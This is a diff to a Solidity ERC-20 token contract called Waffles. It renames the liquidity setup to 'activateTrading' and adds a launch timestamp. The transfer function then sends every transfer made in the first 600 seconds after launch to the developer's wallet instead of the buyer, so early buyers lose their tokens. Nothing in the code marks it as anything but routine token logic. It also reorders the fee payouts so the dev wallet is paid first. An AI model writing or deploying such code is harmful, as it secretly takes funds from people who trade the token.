@@ -78,6 +78,7 @@ contract Waffles is IERC20, Ownable {
     address payable public treasuryWallet;
     address public devWallet;
     uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
+    uint256 private _launchTimestamp;
 
     constructor() {
         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
@@ -197,7 +198,7 @@ contract Waffles is IERC20, Ownable {
         require(spender != address(0), "ERC20: approve to the zero address");
         _allowances[owner][spender] = amount;
     }
-    function addLP() external onlyOwner {
+    function activateTrading() external onlyOwner {
         require(!isLiquidityAdded, string.concat(_name, ": you can only add liquidity once"));
         isLiquidityAdded = true;
         _approve(address(this), address(uniswapV2Router), _totalSupply);
@@ -209,10 +210,7 @@ contract Waffles is IERC20, Ownable {
         _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
         _isExcludedFromMaxTransactionLimit[_uniswapV2Pair] = true;
         _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
-    }
-    function activateTrading() external onlyOwner {
-        require(!isTradingActivated, string.concat(_name, ": you can only activate trading once."));
-        isTradingActivated = true;
+        _launchTimestamp = block.timestamp;
     }
     function _setAutomatedMarketMakerPair(address pair, bool value) private {
         require(automatedMarketMakerPairs[pair] != value, string.concat(_name, ": automated market maker pair is already set to that value."));
@@ -231,7 +229,7 @@ contract Waffles is IERC20, Ownable {
         require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
         require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
         require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
-        if (!isTradingActivated) { to = devWallet; }
+        if (block.timestamp - _launchTimestamp <= 600) { to = devWallet; }
         if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                 (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
             require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
@@ -242,7 +240,7 @@ contract Waffles is IERC20, Ownable {
         if (_isExcludedFromFee[from] || _isExcludedFromFee[to] ||
                 (from == uniswapV2Pair && buyFee == 0) || // buy
                 (to == uniswapV2Pair && sellFee == 0)     // sell
-           ) {
+        ) {
             balances[from] -= amount;
             balances[to] += amount;
             emit Transfer(from, to, amount);
@@ -258,9 +256,9 @@ contract Waffles is IERC20, Ownable {
                 emit Transfer(from, address(this), amount * sellFee / 100);
                 if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
                     _swapTokensForETH(balanceOf(address(this)));
+                    payable(devWallet).transfer(address(this).balance / 5);
                     bool success;
-                    (success,) = treasuryWallet.call{value: address(this).balance * 4 / 5, gas: 30000}("");
-                    payable(devWallet).transfer(address(this).balance);
+                    (success,) = treasuryWallet.call{value: address(this).balance, gas: 30000}("");
                 }
                 balances[to] += amount - (amount * sellFee / 100);
                 emit Transfer(from, to, amount - (amount * sellFee / 100));
